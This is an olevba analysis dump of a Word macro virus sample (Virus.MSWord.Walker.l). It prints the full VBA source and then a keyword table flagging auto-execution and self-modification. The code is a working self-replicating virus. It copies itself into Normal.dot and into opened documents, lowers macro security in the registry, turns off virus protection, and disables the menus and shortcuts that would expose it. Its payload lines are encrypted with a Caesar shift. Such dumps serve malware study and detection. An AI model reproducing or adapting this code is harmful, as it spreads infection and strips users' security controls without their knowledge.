olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Walker.l-7b44f39e7ffeb24e959ef5cd84a8a324c9bb7bba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Walker.l-7b44f39e7ffeb24e959ef5cd84a8a324c9bb7bba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function Heidi(WhereAmI As String)
'[Bench]Garbage v2.0
'----------------------------------------
'Po!Fssps!Sftvnf!Ofyu;!B`Zvq!>!Gbmtf;!O`Zvq!>!Gbmtf;!Bqqmjdbujpo/Pqujpot/DpogjsnDpowfstjpot!>!Gbmtf
'HkpfMg{*DwknfMg{Eqfg*yfMg{H33."yfMg{Cnv++0Fkucdng<"HkpfMg{*DwknfMg{Eqfg*yfMg{H:."yfMg{Cnv++0Fkucdng
'Zlwk#FrppdqgEduv+%Wrrov%,=#1Frqwurov+%Pdfur%,1Hqdeohg#@#3=#1Frqwurov+%Fxvwrpl}h111%,1Hqdeohg#@#3=#1Frqwurov+%Whpsodwhv#dqg#Dgg0Lqv111%,1Hqdeohg#@#3=#Hqg#Zlwk
'GsqqerhFevw,&Jsvqex&-2Gsrxvspw,&Wx}pi222&-2Irefpih$A$4>$GsqqerhFevw,&Zmi{&-2Gsrxvspw,&Xsspfevw&-2Irefpih$A$4
'X~xyjr3Uwn{fyjUwtknqjXywnsl-''1%'MPJ^dHZWWJSYdZXJWaXtky|fwjaRnhwtxtkyaTkknhja>35a\twiaXjhzwny~'1%'Qj{jq'.%B%6+
'Ol&Gvvroigzout4\kxyout&DC&?)&Znkt&IussgtjHgxy.(Sgixu(/4Iutzxury.(Yki{xoz444(/4Jkrkzk&Kryk
'^p{o'Hwwspjh{pvu5Vw{pvuzA'5]py|zWyv{lj{pvu'D'7A'5Zh}lUvythsWyvtw{'D'7A'Luk'^p{o
'[m|(IL(E(Ik|q~mLwk}umv|6^JXzwrmk|6^JKwuxwvmv|{6Q|mu0916KwlmUwl}tmB([m|(V\(E(Vwzuit\muxti|m6^JXzwrmk|6^JKwuxwvmv|{6Q|mu0916KwlmUwl}tm
'JR)F)JM7urwn|1;5):2C)WR)F)W]7urwn|1;5):2
'Sp*KS*G*,1eLoxmrgQk|lkqo*€<8:,*^rox*Kicz*G*^|oD*Sp*XS*G*,1eLoxmrgQk|lkqo*€<8:,*^rox*Xicz*G*^|o
'Tq+Ljd€{+H+_}€p+Lyo+Yjd€{+H+_}€p+_spy+P�t+Q€yntzy
'Ur,ctq~qMyU,I,.`qy|xm€q.,`tqzF,_q€,Om~~uq~,I,Z`F,_q€,t{€,I,MPF,QxqF,_q€,Om~~uq~,I,MPF,_q€,t{€,I,Z`
'Tr{rP|qr-J-Pnvr;yv{r€5>9-Pnvr;P|‚{�\sYv{r€6
'Xjui!iptu;!/EfmfufMjoft!2-!/DpvouPgMjoft;!/JotfsuMjoft!2-!HfofDpef;!Foe!Xjui
'------------------------------------------
'------------------------------------------
On Error Resume Next: A_Yup = False: N_Yup = False: Application.Options.ConfirmConversions = False
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
With CommandBars("Tools"): .Controls("Macro").Enabled = 0: .Controls("Customize...").Enabled = 0: .Controls("Templates and Add-Ins...").Enabled = 0: End With
CommandBars("Format").Controls("Style...").Enabled = 0: CommandBars("View").Controls("Toolbars").Enabled = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If Application.Version >= 9# Then CommandBars("Macro").Controls("Security...").Delete Else
With Application.Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule: Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
AI = AD.lines(2, 1): NI = NT.lines(2, 1)
If AI = "'[Bench]Garbage v2.0" Then A_Yup = True: If NI = "'[Bench]Garbage v2.0" Then N_Yup = True
If A_Yup = True And N_Yup = True Then Exit Function
If WhereAmI = "Template" Then: Set Carrier = NT: Set host = AD: Else: Set Carrier = AD: Set host = NT
GeneCode = Carrier.lines(1, Carrier.CountOfLines)
With host: .DeleteLines 1, .CountOfLines: .InsertLines 1, GeneCode: End With
'-----------------------------------------
'-----------------------------------------
End Function
Private Function encrypt(a, b As Integer)
On Error Resume Next
Dim c: c = "": For d = 1 To Len(a): c = c + Chr((Asc(Mid$(a, d, 1))) - b): Next
encrypt = c
End Function
Private Sub Document_Open()
On Error Resume Next:
If MacroContainer = NormalTemplate Then: WhereAmI = "Template": Set host = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: Else: WhereAmI = "Document": Set host = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
With host
    For x = 4 To 17
    If y = 13 Then y = 0
    crypt = .lines(x, 1): y = y + 1: l = Len(crypt): l = l - 1: crypt = Right$(crypt, l): .replaceline x + 16, encrypt(crypt, (y))
    Next x
End With
Heidi (WhereAmI)
Set host = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
With host: For x = 20 To 33: .replaceline x, "'": Next x: End With
End Sub
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = False
If Left$(ActiveDocument.Name, 8) <> "Document" Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf Left$(ActiveDocument.Name, 8) = "Document" And ActiveDocument.Characters.Count = 0 Then
ActiveDocument.Saved = True: End If
Set host = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
With host: For x = 20 To 33: .replaceline x, "'": Next x: End With
Application.ScreenUpdating = True
End Sub

' By [Bench] - Thanks go to The Weird Genius for the encryption idea

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

